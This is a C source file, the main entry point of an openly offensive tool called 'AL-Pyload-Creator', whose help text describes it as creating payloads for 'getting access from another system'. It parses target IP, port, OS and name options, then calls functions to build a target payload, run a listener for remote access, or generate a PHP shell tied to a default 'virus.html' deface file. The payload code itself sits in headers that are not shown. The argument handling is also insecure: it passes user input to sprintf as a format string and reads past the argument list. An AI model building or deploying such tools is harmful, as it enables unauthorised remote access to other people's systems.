#include "func.h"
#include "malware.h"

int main(int argc, char** argv)
{
	banner();
	if(argc == 1) printf("\033[36margument \033[31mnot\033[36m found!\033[0m\n\n");

	port = 0;
	Tip[0] = '\0';
	Tname[0] = '\0';
	OS[0] = '\0';
	mode[0] ='\0';
	Faddr[0] = '\0';

	// initiali zation
	for(int i = 1; i < argc; i++)
	{
		if(strstr(argv[i], "-mode") || strstr(argv[i], "mode") || strstr(argv[i], "--mode") || strstr(argv[i], "-m")) sprintf(mode, argv[i+1]);

		if(strstr(argv[i], "-os") || strstr(argv[i], "os") || strstr(argv[i], "--os") || strstr(argv[i], "-o"))	sprintf(OS, argv[i+1]);

		if(strstr(argv[i], "-port") || strstr(argv[i], "port") || strstr(argv[i], "--port") || strstr(argv[i], "-p")) port = atoi(argv[i+1]);

		if(strstr(argv[i], "-name") || strstr(argv[i], "name") || strstr(argv[i], "--name") || strstr(argv[i], "-n")) sprintf(Tname, argv[i+1]);
		if(strstr(argv[i], "-ip") || strstr(argv[i], "ip") || strstr(argv[i], "--ip") || strstr(argv[i], "-i")) sprintf(Tip, argv[i+1]);

		if(strstr(argv[i], "-fileaddress") || strstr(argv[i], "fileaddress") || strstr(argv[i], "--fileaddress") || strstr(argv[i], "-fd") || strstr(argv[i], "-FD")) sprintf(Faddr, argv[i+1]);

                if(strstr(argv[i], "-help") || strstr(argv[i], "help") || strstr(argv[i], "--hel[") || strstr(argv[i], "-h"))
                {
                                printf(
                                        "\033[31mNAME\033[0m\n"
                                        "        AL-Pyload-Creator - a tools for create pyload and getting access from another system\n"
                                        "\n"
                                        "\033[31mUSING\033[0m\n"
                                        "        AL-Pyload-Creator [\033[31mARGUMENT\033[0m]\n"
                                        "\n"
                                        "\033[31mOPTIONS\033[0m\n"
                                        "        -h --help  : help\n"
                                        "        -m --mode  : choose model (tc : target Create/ga : getting access)\n"
                                        "        -o --os    : choose Oprating system for create pyload\n"
                                        "        -i --ip    : set ip for target program\n"
                                        "        -p --port  : set port for create a socket\n"
                                        "        -n --name  : choose name program target\n"
                                        "\033[31mEXAMPLE\033[0m\n"
                                        "        ./AL-Pyload-Creator -o Linux -m tc -n tor-configure -p 9090 -i 198.169.0.12\n"
                                        "\033[31mGITHUB\033[0m\n"
                                        "        https://github.com/alirezaarzehgar/AL-Pyload-Creator.git\n"
                                        "\n"
                                );

				return -1;
                }
	}

	// create defualt argument with [pyload creator] option
	if(port == 0) port = 8080;
	if(Tname[0] == '\0') sprintf(Tname, "Target");
	if(Tip[0] == '\0') sprintf(Tip, "127.0.0.1");
	if(OS[0] == '\0') sprintf(OS, "Linux");
	if(Faddr[0] == '\0') sprintf(Faddr, "DefaultDiface/virus.html");

	if(strstr(mode, "targetcreate")  ||
	   strstr(mode, "target-create") ||
	   strstr(mode, "Targetcreate")  ||
	   strstr(mode, "tc")		 ||
	   strstr(mode, "TC")
	   ) 
	{
		if(strstr(OS, "Linux") ||
		   strstr(OS, "LINUX") ||
		   strstr(OS ,"linux"))
	     	{	
			TargetCreator(Tname, Tip, port);
	     	}

                if(strstr(OS, "Server") ||
                   strstr(OS, "SERVER") ||
                   strstr(OS ,"server"))
                {       
			TargetCreator_server(Tname, port);
		}
	}

	else
        if(strstr(mode, "gettingaccess")  ||
           strstr(mode, "getting-access") ||
           strstr(mode, "GettingAccess")  ||
           strstr(mode, "ga")             ||
           strstr(mode, "GA")
           )
	{
		if(strstr(OS, "Linux") ||
                   strstr(OS, "LINUX") ||
                   strstr(OS ,"linux"))
                {       
			 gettingAccess(port);
		}

                if(strstr(OS, "Server") ||
                   strstr(OS, "server") ||
                   strstr(OS ,"SERVER"))
                {
                         gettingAccess_server(port, Tip);
                }

	}

	else
        if(strstr(mode, "shell")  ||
           strstr(mode, "Shell") ||
           strstr(mode, "SHELL")  ||
           strstr(mode, "sh")             ||
           strstr(mode, "SH")
           )
	{
		php_shell(Tname, Faddr);
	}


	return 0;
}
